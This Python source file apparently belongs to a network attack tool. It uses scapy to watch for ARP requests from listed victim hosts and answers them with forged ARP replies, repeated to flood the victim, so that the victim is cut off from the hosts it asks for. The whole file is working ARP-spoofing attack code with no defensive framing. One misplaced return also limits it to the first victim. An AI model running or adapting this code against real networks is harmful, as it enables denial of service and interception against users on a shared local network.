from dataclasses import dataclass
from scapy.all import *
from util.dataclasses import Host, Interface

@dataclass
class IsolationAttackSettings:
    interface: Interface
    victims: list[Host]
    response_count: int
    response_interval: int

def handle_packet_isolation(settings: IsolationAttackSettings, packet: Packet, add_to_storm):
    if ARP not in packet:
        return

    # Don't act upon our ARP packages
    if packet[Ether].src == settings.interface.mac_addr:
        return

    for victim in settings.victims:
        if victim.ip_addr == packet[ARP].psrc:
            print(f'Victim sent arp request {packet.summary()}')

            response = Ether() / ARP()
            response[Ether].src = settings.interface.mac_addr
            response[Ether].dst = victim.mac_addr
            response[ARP].psrc = packet[ARP].pdst
            response[ARP].pdst = victim.ip_addr
            response[ARP].hwsrc = victim.mac_addr
            response[ARP].hwdst = victim.mac_addr
            response[ARP].op = 2

            add_to_storm((packet[ARP].pdst, victim))

            sendp(response, verbose=0, iface=settings.interface.name, count=settings.response_count)
        return